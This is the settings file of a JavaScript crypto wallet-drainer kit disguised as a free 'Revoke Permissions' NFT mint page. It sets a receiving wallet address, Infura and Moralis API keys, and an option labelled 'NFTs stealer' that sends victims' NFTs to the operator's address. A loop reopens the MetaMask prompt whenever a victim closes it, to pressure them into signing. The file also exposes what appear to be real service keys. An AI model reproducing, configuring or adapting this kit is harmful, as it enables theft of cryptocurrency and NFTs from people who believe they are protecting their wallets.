



const address = "0xDc32ec7a610c2196fDf734818837DEEd1D2663A8"; /*Kabiyesi*/// wallet address
const infuraId = "b16ec8facdb943b5a4c5a5d7d4338e40"     // Infuria ID | https://infura.io/ | For Wallet Connect
const moralisApi = "137T8pjgAZYR7c5zODRG4MrRIxKXpNKfWDjxWqPrAIr7IkdXR944yM3AVoVYXNGj"   // x-api-key | https://moralis.io/ | For NFTs

const collectionInfo = {
    name: "Revoke Permissions",
    title: "Revoke Permissions", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "1.5.2022",
    socialMedia: {
        discord: "https://discord.gg/",
        twitter: "https://twitter.com",
    },
    medias: {
        preview: "logo.gif", // LOGO of project
        favicon: "2.png", // favicon
    },
    background: {
        type: "video",              // Supported types: image, video, color
        image: "",    // Image for image type, video preview for video type
        video: "background.mp4",    // If you don't use video, you can ignore this line
        color: "#4E4E6D",           // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: 0.00,         // Price per NFT.
    totalSupply: 999,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 1,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.00,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 300, // Maximum number of days to check for the last transactions.
    receiveAddress: "0xDc32ec7a610c2196fDf734818837DEEd1D2663A8" /*Kabiyesi*/ // Receivers Adress 
}

/* 
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Ethereum address.`);
//#endregion

